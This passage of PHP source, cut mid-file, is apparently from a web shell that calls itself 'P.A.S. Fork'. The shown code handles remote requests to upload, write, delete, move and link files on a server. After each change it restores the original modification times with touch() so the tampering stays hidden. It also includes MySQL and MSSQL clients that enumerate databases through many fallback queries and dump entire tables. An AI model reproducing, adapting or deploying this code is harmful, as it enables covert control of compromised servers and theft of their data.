                    $t = new FileInfo($p);
                    $t = $t->getMTime();
                } else
                    $t = FALSE;
                if (delFOD($v)) {
                    if ($t)
                        $a[$p] = $t;
                    if (!$b) {
                        echo '"r":[';
                        $b = TRUE;
                    }
                    if ($p !== $k) {
                        if ($k !== NULL)
                            echo ']},';
                        echo '{"p":';
                        jsonEcho($p);
                        echo ',"f":[';
                        $k = $p;
                    } else
                        echo ',';
                    jsonEcho($n);
                } else
                    $e[] = $v;
            }
            if ($b)
                echo ']}]';
            if ($e) {
                if ($b)
                    echo ',';
                echo '"e":[';
                foreach ($e as $k => $v) {
                    if ($k > 0)
                        echo ',';
                    jsonEcho($v);
                }
                echo ']';
            }
            foreach ($a as $k => $v)
                touch($k, $v);
            sDie('}');
        }
        if (!empty($_FILES['f']) || !empty($_REQUEST['f'])) {
			
			if(is_array($_REQUEST['f']) && !isset($_FILES['f'])){
				foreach ($_REQUEST['f'] as $k => $v) {
					$_FILES['f']['name'][$k] = basename(key($v));
					$_FILES['f']['tmp_name'][$k] = $v[$_FILES['f']['name'][$k]];
					$_FILES['f']['error'][$k] = 0;
				}
			}
			
		    echo '{';
		    $a = array();
		    $b = FALSE;
		    $i = new FileInfo($D['p']);
		    $i = $i->getMTime();
		    foreach ($_FILES['f']['error'] as $k => $v) {
		        $n = $_FILES['f']['name'][$k];
		        if ($v === 0) {
		            $p = $D['p'] . $n;
		            $t = $_FILES['f']['tmp_name'][$k];
		            if (move_uploaded_file($t, $p) || rename($t, $p) || copy($t, $p) || link($t, $p) || (is_string($c = getFile($t)) && writeFile($p, $c)) || ($t[0] === 'd' && writeFile($p, base64_decode(substr(strrchr($t, ','), 1))))) {
		                $a[] = $n;
		                if ($i)
		                    touch($p, $i);
		                continue;
		            }
		        }
		        if ($b)
		            echo ',';
		        else {
		            $b = TRUE;
		            echo '"e":[';
		        }
		        jsonEcho($v . $n);
		    }
		    if ($b)
		        echo ']';
		    if (count($a) > 0) {
		        if ($i) {
		            touch($D['p'], $i);
		            clearstatcache();
		        }
		        if ($b)
		            echo ',';
		        echo '"p":';
		        jsonEcho($D['p']);
		        echo ',"f":[';
		        foreach ($a as $v)
		            outFileInfo($D['p'] . $v);
		        echo ']';
		        outFileInfo(NULL, TRUE);
		    }
		    sDie('}');
		}
        if (isset($D['w'])) {
            $a = array();
            if (is_file($D['w']) || file_exists($D['w'])) {
                $i = new FileInfo($D['w']);
                if ($i->isDir())
                    sDie('{"e":"(path already exists as directory)"}');
            } else {
                $p     = filePath($D['w']);
                $i     = new FileInfo($p);
                $a[$p] = $i->getMTime();
            }
            $a[$D['w']] = $i->getMTime();
            switch ($D['e']) {
                case 0:
                    $v = "\r\n";
                    break;
                case 1:
                    $v = "\n";
                    break;
                case 2:
                    $v = "\r";
                    break;
            }
            $D['t'] = strtr($D['t'], array(
                "\r\n" => $v,
                "\r" => $v,
                "\n" => $v
            ));
            if (writeFile($D['w'], $D['t'])) {
				
				if(function_exists('opcache_invalidate')) opcache_invalidate($D['w'], true);
				
                foreach ($a as $k => $v)
                    if ($v)
                        touch($k, $v);
                clearstatcache();
                $i = new FileInfo($D['w']);
                echo "\x01\x02";
                $b = outFile($D['w']);
                echo "\x03\x1E";
                if ($b) {
                    echo "\x06";
                    jsonFileInfo($i, TRUE);
                } else
                    echo "\x15", $D['w'];
                sDie("\x17\x04\x10");
            }
            sDie('{"e":""}');
        }
        if (isset($D['l'])) {
            $p = filePath($D['l']);
            $t = new FileInfo($p);
            $t = $t->getMTime();
            if ($D['t'] == 0 ? symlink($D['p'], $D['l']) : link($D['p'], $D['l'])) {
                if ($t) {
                    if ($D['t'] != 0)
                        touch($D['l'], $t);
                    touch($p, $t);
                    clearstatcache();
                }
                jsonFileInfo(new FileInfo($D['l']), TRUE);
                sDie();
            }
            sDie('{"e":""}');
        }
        if (isset($D['m'])) {
            if (is_file($D['m']) || is_dir($D['m']) || file_exists($D['m']))
                sDie('{"e":"(path already exists)"}');
            $p = filePath($D['m']);
            $i = new FileInfo($p);
            $i = $i->getMTime();
            if (mkdir($D['m'], 0755)) {
                if ($i) {
                    touch($D['m'], $i);
                    touch($p, $i);
                    clearstatcache();
                }
                jsonFileInfo(new FileInfo($D['m']), TRUE);
                sDie();
            }
            sDie('{"e":""}');
        }
        if (isset($D['f'])) {
            echo '{';
            $a = array();
            $m = array();
            $c = array();
            $b = FALSE;
            $t = new FileInfo($D['f']);
            $t = $t->getMTime();
            if (isset($D['v']))
                foreach ($D['v'] as $v) {
                    $i = new FileInfo($v);
                    $j = $i->getMTime();
                    $f = $D['f'] . $i->getFileName();
                    $s = $i->getPath();
                    if (!isset($a[$s])) {
                        $n = new FileInfo($s);
                        $n = $n->getMTime();
                    } else
                        $n = FALSE;
                    if (rename($v, $f)) {
                        if ($n)
                            $a[$s] = $n;
                        if ($j)
                            $a[$f] = $j;
                        $m[$s][] = $i->getFileName();
                    } else {
                        if ($b)
                            echo ',';
                        else {
                            echo '"e":[';
                            $b = TRUE;
                        }
                        jsonEcho($v);
                    }
                }
            if (isset($D['p']))
                foreach ($D['p'] as $v) {
                    $i = new FileInfo($v);
                    $f = $D['f'] . $i->getFileName();
                    if (copy($v, $f) || link($v, $f) || (!$i->isDir() && is_string($s = getFile($v)) && writeFile($f, $s))) {
                        $v = $i->getMTime();
                        if ($v)
                            $a[$f] = $v;
                        $c[] = $i->getFileName();
                    } else {
                        if ($b)
                            echo ',';
                        else {
                            echo '"e":[';
                            $b = TRUE;
                        }
                        jsonEcho($v);
                    }
                }
            if ($b)
                echo ']';
            if (count($m) > 0 || count($c) > 0) {
                foreach ($a as $k => $v)
                    touch($k, $v);
                if ($t)
                    touch($D['f'], $t);
                clearstatcache();
                if ($b)
                    echo ',';
                echo '"p":';
                jsonEcho($D['f']);
                if (count($m) > 0) {
                    echo ',"m":[';
                    $b = FALSE;
                    foreach ($m as $k => $a) {
                        if ($b)
                            echo ',';
                        else
                            $b = TRUE;
                        echo '{"p":';
                        jsonEcho($k);
                        outFileInfo(NULL, FALSE);
                        echo ',"f":[';
                        foreach ($a as $v)
                            outFileInfo($D['f'] . $v);
                        echo ']}';
                    }
                    echo ']';
                }
                if (count($c) > 0) {
                    echo ',"c":[';
                    $b = FALSE;
                    foreach ($c as $v)
                        outFileInfo($D['f'] . $v);
                    echo ']';
                }
                outFileInfo(NULL, TRUE);
            }
            sDie('}');
        }
        break;
    case 's':
        define('T_DMPHDR', "-- \n-- This SQL dump created by P.A.S. Fork v." . VER . "\n-- \n-- Started at %s UTC\n");
        define('T_DMPFTR', "-- Finished at %s UTC");
        define('E_SLCTDT', "Can't load data from table %s\n");
        define('E_CNSTCS', "Can't construct create statement for table %s\n");
        define('E_CHNGDB', "Can't change database to %s for dump table %s.%s\n");
        class SQLBase {
            var $_cnct, $_res;
            function connError($m, $h, $u, $p, $b) {
                echo '{"e":';
                jsonEcho($m ? $m : "Can't connect to SQL server" . ($h === NULL ? '' : ' ' . $h) . ($u === NULL ? '' : ' as user "' . $u . '"') . ($p === NULL ? '' : ' with password "' . $p . '"') . ($b === NULL ? '' : ' and select database "' . $b . '"') . '.');
                sDie('}');
            }
            function getError() {
                $v = $this->_cnct->errorInfo();
                return $v[2];
            }
            function tryQueries($a) {
                $i = $this->_cnct;
                foreach ($a as $v)
                    if ($this->_res = $i->query($v))
                        return TRUE;
                return FALSE;
            }
            function fetchAssoc() {
                return $this->_res->fetch(PDO::FETCH_ASSOC);
            }
            function fetchRow() {
                return $this->_res->fetch(PDO::FETCH_NUM);
            }
            function query($v) {
                return ($this->_res = $this->_cnct->query($v));
            }
            function fetchBase() {
                return $this->_res->fetchColumn(0);
            }
            function fetchTable() {
                return $this->_res->fetchColumn(0);
            }
            function getColumnsNames($v) {
                $a = array();
                if (($v = $this->_cnct->query('SELECT * FROM ' . $v . ' LIMIT 1')) && ($v = $v->fetch(PDO::FETCH_ASSOC))) {
                    foreach ($v as $k => $i)
                        $a[$k] = '';
                    return $a;
                }
                return FALSE;
            }
            function sqlTableSize($v) {
                return ($v = $this->_cnct->query('SELECT COUNT(*) FROM ' . $v)) ? $v->fetchColumn(0) : '"?"';
            }
            function close() {
                $this->_cnct = NULL;
            }
        }
        function sqlJoinColumns($a, $f) {
            if ($a) {
                foreach ($a as $k => $v)
                    $a[$k] = $f($v);
                return implode(',', $a);
            }
            return '*';
        }
        function sqlOutCreate($t, $c, $d, $f) {
            echo "\nCREATE TABLE ", $f($t), " (\n";
            $b = FALSE;
            foreach ($c as $k => $v) {
                if ($b)
                    echo ",\n";
                else
                    $b = TRUE;
                echo '  ', $f($k), ' ', $v ? $v : $d;
            }
            echo "\n);\n";
        }
        function sqlOutInsert($t, $c) {
            echo "\nINSERT INTO ", $t;
            if ($c !== '*')
                echo ' (', $c, ')';
            echo ' VALUES';
        }
        function sqlOutValues($a, $f) {
            echo "\n(";
            $b = FALSE;
            foreach ($a as $v) {
                if ($b)
                    echo ',';
                else
                    $b = TRUE;
                if ($v === NULL)
                    echo 'NULL';
                else
                    echo $f($v);
            }
            echo ')';
        }
        function csvOutValues($a) {
            $c = 0;
            $b = FALSE;
            foreach ($a as $v) {
                if ($b)
                    echo ';';
                else
                    $b = TRUE;
                if ($v === NULL)
                    echo '\N';
                else {
                    $v = str_replace(array(
                        '"',
                        ';',
                        "\r",
                        "\n"
                    ), array(
                        '""',
                        ';',
                        '\r',
                        '\n'
                    ), $v, $c);
                    echo $c > 0 ? '"' . $v . '"' : $v;
                }
            }
        }
        function mysqlEscData($v) {
            return "'" . str_replace(array(
                '\\',
                "'",
                '"',
                "\0",
                "\n",
                "\r",
                "\x1A"
            ), array(
                '\\\\',
                "\\'",
                '\\"',
                '\\0',
                '\\n',
                '\\r',
                '\\Z'
            ), $v) . "'";
        }
        function mysqlEscName() {
            $a = func_get_args();
            foreach ($a as $k => $v)
                $a[$k] = '`' . str_replace('`', '``', $v) . '`';
            return implode('.', $a);
        }
        class MySQLBase extends SQLBase {
            var $haveSchemas = FALSE, $canPaginate = TRUE;
            function charset($k) {
                $v = array(
                    'utf8',
                    'utf16',
                    'cp1250',
                    'cp1251',
                    'latin1',
                    'latin5',
                    'cp1256',
                    'cp1257',
                    'latin1',
                    'latin2',
                    'greek',
                    'hebrew',
                    'latin5',
                    'latin7',
                    'big5',
                    'gbk',
                    'sjis',
                    'euckr',
                    'ujis',
                    'cp866',
                    'koi8r',
                    'koi8u'
                );
                return isset($v[$k]) ? $v[$k] : 'utf8';
            }
            function parseCrtTbl($v) {
                $a = array();
                $n = '`((?:[^`]|``)+)`';
                $l = ' \(((?:`(?:[^`]|``)+`,?)+)\)';
                $t = '(?: USING (?:BTREE|HASH))?';
                $c = '(?:\s+CONSTRAINT(?: `(?:[^`]|``)+)`)?\s+';
                $e = '(`(?:[^`]|``)+`)';
                preg_match_all('#^\s+' . $n . ' ([a-z]+)((?:\(| ).+)?,?$#Um', $v, $m);
                foreach ($m[1] as $k => $i)
                    $a[$i] = strtoupper($m[2][$k]) . $m[3][$k];
                if (preg_match('#^' . $c . 'PRIMARY KEY' . $t . $l . '.*$#Um', $v, $m)) {
                    preg_match_all('#' . $n . '#', $m[1], $m);
                    foreach ($m[1] as $i)
                        $a[$i] .= ', PRIMARY KEY';
                }
                if (preg_match_all('#^\s+(?:INDEX|KEY)(?: ' . $e . ')?' . $t . $l . '.*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', KEY' . $k;
                    }
                if (preg_match_all('#^' . $c . 'UNIQUE(?: (?:INDEX|KEY))?(?: ' . $e . ')?' . $t . $l . '.*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', UNIQUE KEY' . $k;
                    }
                if (preg_match_all('#^\s+(?:FULLTEXT|SPATIAL)(?: (?:INDEX|KEY))?(?: ' . $e . ')?' . $l . '.*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', FULLTEXT KEY' . $k;
                    }
                if (preg_match_all('#^' . $c . 'FOREIGN KEY(?: ' . $e . ')?' . $l . ' REFERENCES (`(?:[^`]|``)+` \((?:`(?:[^`]|``)+`,?)+\)).*$#Um', $v, $m))
                    foreach ($m[1] as $i => $k) {
                        if ($k !== '')
                            $k = ' ' . $k;
                        $k .= ' ' . $m[3][$i];
                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
                        foreach ($r[1] as $i)
                            $a[$i] .= ', FOREIGN KEY' . $k;
                    }
                return $a;
            }
            function prepType($v) {
                $s = ($i = strpos($v[1], '(')) ? strtoupper(substr($v[1], 0, $i)) . substr($v[1], $i) : strtoupper($v[1]);
                if ($v[2] === 'NO')
                    $s .= ' NOT NULL';
                if ($v[4] !== NULL)
                    $s .= ' DEFAULT ' . mysqlEscData($v[4]);
                if ($v[5] !== NULL)
                    $s .= ' ' . strtoupper($v[5]);
                switch ($v[3]) {
                    case 'PRI':
                        $s .= ' PRIMARY KEY';
                        break;
                    case 'UNI':
                        $s .= ' UNIQUE KEY';
                        break;
                    case 'MUL':
                        $s .= ', KEY(' . mysqlEscName($v[0]) . ')';
                        break;
                }
                return $s;
            }
            function getBases() {
                return $this->tryQueries(array(
                    'SHOW DATABASES',
                    'SHOW SCHEMAS',
                    'SELECT schema_name FROM information_schema.schemata',
                    'SELECT DISTINCT table_schema FROM information_schema.tables',
                    'SELECT DISTINCT table_schema FROM information_schema.columns'
                ));
            }
            function getTables($b) {
                $v = mysqlEscData($b);
                return $this->tryQueries(array(
                    'SHOW TABLES FROM ' . mysqlEscName($b),
                    'SELECT table_name FROM information_schema.tables WHERE table_schema=' . $v,
                    'SELECT DISTINCT table_name FROM information_schema.columns WHERE table_schema=' . $v
                ));
            }
            function getColumns($b, $t) {
                $a = array();
                $e = mysqlEscName($b, $t);
                if ($this->tryQueries(array(
                    'SHOW COLUMNS FROM ' . $e,
                    'SHOW FIELDS FROM ' . $e,
                    'DESC ' . $e,
                    'DESCRIBE ' . $e,
                    'SELECT column_name,column_type,is_nullable,column_key,column_default,extra FROM information_schema.columns WHERE table_name=' . mysqlEscData($t) . ' AND table_schema=' . mysqlEscData($b)
                ))) {
                    while ($v = $this->fetchRow())
                        $a[$v[0]] = $this->prepType($v);
                    return $a;
                }
                if ($this->query('SHOW CREATE TABLE ' . $e) && ($v = $this->fetchRow()))
                    return $this->parseCrtTbl($v[1]);
                return $a;
            }
            function select($b, $t, $c, $o, $l) {
                return $this->query('SELECT ' . sqlJoinColumns($c, 'mysqlEscName') . ' FROM ' . mysqlEscName($b, $t) . ' LIMIT ' . $o . ',' . $l);
            }
            function outCreateTable($b, $t) {
                if ($this->query('SHOW CREATE TABLE ' . mysqlEscName($b, $t)) && ($v = $this->fetchRow())) {
                    echo "\n", $v[1], ";\n";
                    return '';
                }
                if ($v = $this->getColumns($b, $t)) {
                    sqlOutCreate($t, $v, 'BLOB', 'mysqlEscName');
                    return '';
                }
                return sprintf(E_CNSTCS, $b . '.' . $t);
            }
        }
        class MySQLClient extends MySQLBase {
            function connect($h, $u, $p, $b, $c) {
                if (!($this->_cnct = mysql_connect($h, $u, $p)))
                    return FALSE;
                mysql_query('SET NAMES ' . $this->charset($c), $this->_cnct);
                if ($b !== NULL && !mysql_select_db($b, $this->_cnct))
                    return mysql_query('USE ' . mysqlEscName($b), $this->_cnct);
                return TRUE;
            }
            function getError() {
                if ($this->_cnct) {
                    $v = mysql_error($this->_cnct);
                    mysql_close($this->_cnct);
                    return $v;
                }
                return mysql_error();
            }
            function tryQueries($a) {
                foreach ($a as $v)
                    if ($this->_res = mysql_query($v, $this->_cnct))
                        return TRUE;
                return FALSE;
            }
            function getBases() {
                return (($this->_res = mysql_list_dbs($this->_cnct)) || parent::getBases());
            }
            function fetchBase() {
                return ($v = mysql_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function fetchTable() {
                return ($v = mysql_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function getTables($b) {
                return (($this->_res = mysql_list_tables($b, $this->_cnct)) || parent::getTables($b));
            }
            function getTableSize($b, $t) {
                return ($v = mysql_query('SELECT COUNT(*) FROM ' . mysqlEscName($b, $t), $this->_cnct)) ? mysql_result($v, 0) : '"?"';
            }
            function getColumns($b, $t) {
                if ($a = parent::getColumns($b, $t))
                    return $a;
                $e = mysqlEscName($b, $t);
                $q = FALSE;
                if (($q = mysql_list_fields($b, $t, $this->_cnct)) || ($q = mysql_query('SELECT * FROM ' . $e . ' LIMIT 0', $this->_cnct))) {
                    if ($v = mysql_fetch_field($q)) {
                        do {
                            $s = $v->type === 'string' ? 'TEXT' : strtoupper($v->type);
                            if ($v->unsigned)
                                $s .= ' UNSIGNED';
                            if ($v->zerofill)
                                $s .= ' ZEROFILL';
                            if ($v->not_null)
                                $s .= ' NOT NULL';
                            if (isset($v->def) && $v->def !== '' && $v->def !== NULL)
                                $s .= ' DEFAULT ' . mysqlEscData($v->def);
                            if ($v->primary_key)
                                $s .= ' PRIMARY KEY';
                            elseif ($v->unique_key)
                                $s .= ' UNIQUE KEY';
                            elseif ($v->multiple_key)
                                $s .= ', KEY(' . mysqlEscName($v->name) . ')';
                            $a[$v->name] = $s;
                        } while ($v = mysql_fetch_field($q));
                        return $a;
                    }
                    if (is_string($v = mysql_field_name($q, 0))) {
                        $i = 0;
                        do {
                            if (is_string($s = mysql_field_type($q, $i)))
                                $a[$v] = $s === 'string' ? 'TEXT' : strtoupper($s);
                            if (($a[$v] === 'INT' || $a[$v] === 'REAL') && ($s = mysql_field_len($q, $i)))
                                $a[$v] .= '(' . $s . ')';
                            if (is_string($s = mysql_field_flags($q, $i))) {
                                if (strpos($s, 'unsigned') !== FALSE)
                                    $a[$v] .= ' UNSIGNED';
                                if (strpos($s, 'zerofill') !== FALSE)
                                    $a[$v] .= ' ZEROFILL';
                                if (strpos($s, 'not_null') !== FALSE)
                                    $a[$v] .= ' NOT NULL';
                                if (strpos($s, 'auto_increment') !== FALSE)
                                    $a[$v] .= ' AUTO_INCREMENT';
                                if (strpos($s, 'primary_key') !== FALSE)
                                    $a[$v] .= ' PRIMARY KEY';
                                elseif (strpos($s, 'unique_key') !== FALSE)
                                    $a[$v] .= ' UNIQUE KEY';
                                elseif (strpos($s, 'multiple_key') !== FALSE)
                                    $a[$v] .= ', KEY(' . mysqlEscName($v) . ')';
                            }
                        } while (is_string($v = mysql_field_name($q, ++$i)));
                        return $a;
                    }
                }
                if (($v = mysql_query('SELECT * FROM ' . $e . ' LIMIT 1', $this->_cnct)) && ($v = mysql_fetch_assoc($v))) {
                    foreach ($v as $k => $s)
                        $a[$k] = '';
                    return $a;
                }
                return FALSE;
            }
            function fetchAssoc() {
                return mysql_fetch_assoc($this->_res);
            }
            function fetchRow() {
                return mysql_fetch_row($this->_res);
            }
            function query($v) {
                return ($this->_res = mysql_query($v, $this->_cnct));
            }
            function dump($b, $t, $c, $f) {
                if ($f)
                    $i = $this->outCreateTable($b, $t);
                $c = sqlJoinColumns($c, 'mysqlEscName');
                if (($q = mysql_unbuffered_query('SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t), $this->_cnct)) && ($v = mysql_fetch_assoc($q))) {
                    if ($f)
                        sqlOutInsert(mysqlEscName($t), $c);
                    else
                        echo implode(';', array_keys($v)), "\n";
                    $d = FALSE;
                    do {
                        if ($d)
                            echo $d;
                        else
                            $d = $f ? ',' : "\n";
                        if ($f)
                            sqlOutValues($v, 'mysqlEscData');
                        else
                            csvOutValues($v);
                    } while ($v = mysql_fetch_row($q));
                    if ($f)
                        echo ";\n";
                    mysql_free_result($q);
                } else
                    $i .= sprintf(E_SLCTDT, $b . '.' . $t);
                return $i;
            }
            function close() {
                mysql_close($this->_cnct);
            }
        }
        class MySQLiClient extends MySQLBase {
            function connect($h, $u, $p, $b, $c) {
                if ($h !== NULL && ($v = strrpos($h, ':'))) {
                    $t = (int) substr($h, $v + 1);
                    $h = substr($h, 0, $v);
                } else
                    $t = NULL;
                if (!($this->_cnct = mysqli_connect($h, $u, $p, $b, $t)))
                    return FALSE;
                mysqli_query($this->_cnct, 'SET NAMES ' . $this->charset($c));
                return TRUE;
            }
            function getError() {
                if ($this->_cnct) {
                    $v = mysqli_error($this->_cnct);
                    mysqli_close($this->_cnct);
                    return $v;
                }
                return mysqli_connect_error();
            }
            function tryQueries($a) {
                foreach ($a as $v)
                    if ($this->_res = mysqli_query($this->_cnct, $v))
                        return TRUE;
                return FALSE;
            }
            function fetchBase() {
                return ($v = mysqli_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function fetchTable() {
                return ($v = mysqli_fetch_row($this->_res)) ? $v[0] : FALSE;
            }
            function getTableSize($b, $t) {
                if ($v = mysqli_query($this->_cnct, 'SELECT COUNT(*) FROM ' . mysqlEscName($b, $t))) {
                    $v = mysqli_fetch_row($v);
                    return $v[0];
                }
                return '"?"';
            }
            function getColumns($b, $t) {
                if ($a = parent::getColumns($b, $t))
                    return $a;
                $e = mysqlEscName($b, $t);
                $q = FALSE;
                if ($q = mysqli_query($this->_cnct, 'SELECT * FROM ' . $e . ' LIMIT 1')) {
                    $y = array(
                        'DECIMAL',
                        'TINYINT',
                        'SMALLINT',
                        'INT',
                        'FLOAT',
                        'DOUBLE',
                        'NULL',
                        'TIMESTAMP',
                        'BIGINT',
                        'MEDIUMINT',
                        'DATE',
                        'TIME',
                        'DATETIME',
                        'YEAR',
                        'NEWDATE',
                        16 => 'BIT',
                        246 => 'DECIMAL',
                        247 => 'ENUM',
                        248 => 'SET',
                        249 => 'TINY',
                        250 => 'MEDIUM',
                        251 => 'LONG',
                        252 => '',
                        253 => 'VARCHAR',
                        254 => 'CHAR',
                        255 => 'GEOMETRY'
                    );
                    if (!($v = mysqli_fetch_fields($q)) && ($i = mysqli_fetch_field($q))) {
                        $v = array();
                        do {
                            $v[] = $i;
                        } while ($i = mysqli_fetch_field($q));
                    }
                    if ($v) {
                        foreach ($v as $i) {
                            if ($i->type > 248 && $i->type < 253)
                                $s = $y[$i->type] . (($i->flags & 16) ? 'BLOB' : 'TEXT');
                            else
                                $s = isset($y[$i->type]) ? $y[$i->type] : 'BLOB';
                            if ($i->flags & 32768) {
                                $s .= '(' . $i->length;
                                if ($i->decimals)
                                    $s .= ',' . $i->decimals;
                                $s .= ')';
                            }
                            if ($i->flags & 32)
                                $s .= ' UNSIGNED';
                            if ($i->flags & 64)
                                $s .= ' ZEROFILL';
                            if ($i->flags & 1)
                                $s .= ' NOT NULL';
                            if (isset($i->def) && $i->def !== '' && $i->def !== NULL)
                                $s .= ' DEFAULT ' . mysqlEscData($i->def);
                            if ($i->flags & 512)
                                $s .= ' AUTO_INCREMENT';
                            if ($i->flags & 2)
                                $s .= ' PRIMARY KEY';
                            elseif (($i->flags & 4) || ($i->flags & 65536))
                                $s .= ' UNIQUE KEY';
                            elseif (($i->flags & 8) || ($i->flags & 16384))
                                $s .= ', KEY(' . mysqlEscName($i->name) . ')';
                            $a[$i->name] = $s;
                        }
                        return $a;
                    }
                    if ($v = mysqli_fetch_assoc($q)) {
                        foreach ($v as $k => $i)
                            $a[$k] = '';
                        return $a;
                    }
                }
                return FALSE;
            }
            function fetchAssoc() {
                return mysqli_fetch_assoc($this->_res);
            }
            function fetchRow() {
                return mysqli_fetch_row($this->_res);
            }
            function query($v) {
                return ($this->_res = mysqli_query($this->_cnct, $v));
            }
            function dump($b, $t, $c, $f) {
                if ($f)
                    $i = $this->outCreateTable($b, $t);
                $c = sqlJoinColumns($c, 'mysqlEscName');
                if (($q = mysqli_query($this->_cnct, 'SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t), MYSQLI_USE_RESULT)) && ($v = mysqli_fetch_assoc($q))) {
                    if ($f)
                        sqlOutInsert(mysqlEscName($t), $c);
                    else
                        echo implode(';', array_keys($v)), "\n";
                    $d = FALSE;
                    do {
                        if ($d)
                            echo $d;
                        else
                            $d = $f ? ',' : "\n";
                        if ($f)
                            sqlOutValues($v, 'mysqlEscData');
                        else
                            csvOutValues($v);
                    } while ($v = mysqli_fetch_row($q));
                    if ($f)
                        echo ";\n";
                    mysqli_free_result($q);
                } else
                    $i .= sprintf(E_SLCTDT, $b . '.' . $t);
                return $i;
            }
            function close() {
                mysqli_close($this->_cnct);
            }
        }
        function mssqlEscData($v) {
            return "'" . str_replace("'", "''", $v) . "'";
        }
        function mssqlEscName() {
            $a = func_get_args();
            foreach ($a as $k => $v)
                $a[$k] = '[' . str_replace(']', ']]', $v) . ']';
            return implode('.', $a);
        }
        class MSSQLBase extends SQLBase {
            var $haveSchemas = TRUE, $canPaginate = TRUE, $_base = NULL;
            function getBases() {
                return $this->tryQueries(array(
                    'SELECT name FROM sys.databases',
                    'SELECT name FROM sys.sysdatabases',
                    'SELECT name FROM master.dbo.sysdatabases',
                    'EXEC sp_oledb_database',
                    'EXEC master.dbo.sp_msdbuseraccess "db"',
                    'EXEC master.sys.sp_msdbuseraccess "db"',
                    "EXEC sp_msforeachdb 'SELECT ''?'''",
                    'EXEC sp_helpdb',
                    'EXEC sp_databases',
                    'EXEC sp_oledb_defdb',
                    'SELECT DISTINCT catalog_name FROM information_schema.schemata',
                    'SELECT DB_NAME()'
                ));
            }
            function getSchemas($b) {
                return $this->tryQueries(array(
                    'SELECT NULL,schema_name FROM information_schema.schemata',
                    'SELECT NULL,name FROM sys.schemas',
                    'SELECT DISTINCT schema_id,SCHEMA_NAME(schema_id) FROM sys.all_objects',
                    'EXEC sp_schemata_rowset',
                    'SELECT DISTINCT schema_id,SCHEMA_NAME(schema_id) FROM sys.objects',
                    'SELECT DISTINCT schema_id,SCHEMA_NAME(schema_id) FROM sys.tables',
                    "SELECT NULL,name FROM sys.database_principals WHERE type='S'"
                ));
            }
            function getTables($b, $s) {
                $s = mssqlEscData($s);
                if ($this->query('SELECT SCHEMA_ID(' . $s . ')') && ($v = $this->fetchRow()) && $v[0]) {
                    $sr = 'schema_id=' . $v[0];
                    $ur = 'uid=' . $v[0];
                } else {
                    $sr = 'SCHEMA_NAME(schema_id)=' . $s;
                    $ur = 'SCHEMA_NAME(uid)=' . $s;
                }
                return $this->tryQueries(array(
                    "SELECT name FROM sys.all_objects WHERE type IN('U','S','V') AND " . $sr,
                    'EXEC sp_tables @table_owner=' . $s,
                    "SELECT name FROM sys.objects WHERE type IN('U','S','V') AND " . $sr,
                    "SELECT name FROM sysobjects WHERE xtype IN('U','S','V') AND " . $ur,
                    'SELECT table_name FROM information_schema.tables WHERE table_schema=' . $s,
                    'SELECT name FROM sys.tables WHERE ' . $sr,
                    "EXEC sp_msforeachtable 'SELECT PARSENAME(''?'',1)', @whereand='AND " . str_replace("'", "''", $sr) . "'"
                ));
            }
            function getColumns($b, $s, $t) {
                $a    = array();
                $sd   = mssqlEscData($s);
                $sn   = mssqlEscName($s);
                $td   = mssqlEscData($t);
                $tn   = mssqlEscName($t);
                $stdn = mssqlEscData($sn . '.' . $tn);
                if ($this->query('EXEC sp_columns ' . $td . ',' . $sd) && $v = $this->fetchRow()) {
                    do {
                        $v[5] = strtoupper($v[5]);
                        if ($v[10] === 0)
                            $v[5] .= ' NOT NULL';
                        if ($v[12] !== NULL)
                            $v[5] .= ' DEFAULT' . $v[12];
                        $a[$v[3]] = $v[5];
                    } while ($v = $this->fetchRow());
                    return $a;
                }
                if ($this->query('EXEC sp_help ' . $stdn) && $this->nextResult() && ($v = $this->fetchRow())) {
                    do {
                        $v[1] = strtoupper($v[1]);
                        if ($v[6] === 'no')
                            $v[1] .= ' NOT NULL';
                        $a[$v[0]] = $v[1];
                    } while ($v = $this->fetchRow());
                    return $a;
                }
                if ($this->query('EXEC sp_mshelpcolumns ' . $stdn) && $v = $this->fetchRow()) {
                    do {
                        $v[6] = strtoupper($v[6]);
                        if ($v[9] === 0)
                            $v[6] .= ' NOT NULL';
                        if ($v[17] !== NULL)
                            $v[6] .= ' DEFAULT' . $v[17];
                        $a[$v[0]] = $v[6];
                    } while ($v = $this->fetchRow());
                    return $a;
                }
                if ($this->query('SELECT column_name,data_type,is_nullable,column_default FROM information_schema.columns WHERE table_name=' . $td . ' AND table_schema=' . $sd) && $v = $this->fetchRow()) {
                    do {
                        $v[1] = strtoupper($v[1]);
                        if ($v[2] === 'NO')
                            $v[1] .= ' NOT NULL';
                        if ($v[3] !== NULL)
                            $v[1] .= ' DEFAULT' . $v[3];
                        $a[$v[0]] = $v[1];
                    } while ($v = $this->fetchRow());
                    return $a;
                }
                if ($this->query('EXEC sp_columns_managed @owner=' . $sd . ', @table=' . $td) && $v = $this->fetchRow()) {
                    do {
                        $v[7] = strtoupper($v[7]);
                        if ($v[6] === 'NO')
                            $v[7] .= ' NOT NULL';
                        if ($v[5] !== NULL)
                            $v[7] .= ' DEFAULT' . $v[5];
                        $a[$v[3]] = $v[7];
                    } while ($v = $this->fetchRow());
                    return $a;
                }
                if ($this->query('SELECT OBJECT_ID(' . $stdn . ')') && $v = $this->fetchRow()) {
                    $r = 'object_id=' . $v[0];
                    $i = 'id=' . $v[0];
                } else {
                    $r = 'OBJECT_SCHEMA_NAME(object_id)=' . $sd . ' AND OBJECT_NAME(object_id)=' . $td;
                    $i = 'OBJECT_SCHEMA_NAME(id)=' . $sd . ' AND OBJECT_NAME(id)=' . $td;
                }
                if ($this->tryQueries(array(
